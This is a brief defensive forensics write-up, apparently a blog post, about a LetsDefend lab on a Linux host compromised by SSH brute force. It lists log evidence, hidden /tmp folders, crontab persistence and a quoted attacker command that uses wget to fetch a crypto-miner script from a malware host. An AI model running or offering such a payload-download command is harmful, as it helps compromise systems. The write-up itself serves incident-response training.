---
title: "LetsDefend: Linux Forensics"
tags: [letsdefend, blue-team, linux, forensics]
date: 2024-01-01
description: Investigating auth.log and bash history for compromise.
---

# LetsDefend: Linux Forensics

**Scenario**: SSH Brute Force successful.

## Artifacts
1.  `/var/log/auth.log`: Saw thousands of `Failed password` followed by `Accepted password`.
2.  `.bash_history`: Attacker ran `wget http://malware.com/miner.sh`.
3.  `/tmp/`: Common dropping ground for malware (`/tmp/.X11-unix` hidden folders).
4.  `cron`: Persistence added to `/etc/crontab`.
